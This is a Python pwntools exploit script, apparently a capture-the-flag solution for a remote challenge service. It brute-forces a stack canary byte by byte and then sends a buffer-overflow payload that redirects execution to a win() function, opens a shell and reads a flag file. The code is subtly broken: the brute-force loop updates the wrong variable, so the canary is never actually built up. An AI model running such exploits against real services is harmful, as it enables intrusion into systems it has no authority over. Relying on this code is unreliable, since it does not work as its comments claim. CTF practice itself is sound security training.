#!/usr/bin/env python3
from pwn import *

# Parametri forniti
OFFSET_TO_CANARY = 136
OFFSET_TO_RIP = OFFSET_TO_CANARY + 16 # Canary(8) + RBP(8)
ret_gadget = 0x40101a
win_addr = 0x401630

HOST, PORT = 'offsec.m0lecon.it', 13578
# canary for this instance: 0x8392adae9215300

#elf = ELF('./lighthouse', checksec=False)

known_canary = b"\x00"  # first byte is always 0x00

for i in range(7):
    for bval in range(256):
        guess = known_canary + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess

        io = remote(HOST, PORT, level='error')

        # select the option with the vuln function
        io.recvuntil(b"> ")
        io.sendline(b"1") 

        io.recvuntil(b"entry: ")

        io.send(payload)
        try:
            data = io.recvall(timeout=0.2)
        except EOFError:
            data = b""
        io.close()

        if b"Log entry recorded" in data:
            known = guess
            print(f"byte {i+1}: {bval:02x}")
            break

canary_val = u64(known_canary.ljust(8, b"\x00"))
canary = u64(known_canary)
print(f"Canary completo: {canary:#x}")

# final exploit

io = remote(HOST,PORT)
io.recvuntil(b"> ")
io.sendline(b"1")
io.recvuntil(b"entry: ")

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * 8,      # Sovrascriviamo RBP
    p64(ret_gadget),    # Allineamento stack (16-byte alignment per system)
    p64(win_addr),       # Indirizzo di win()
)

io.send(payload)
log.success("Payload inviato! Dovresti avere una shell.")

sleep(0.5)
io.sendline(b'cat /home/user/flag')

io.interactive()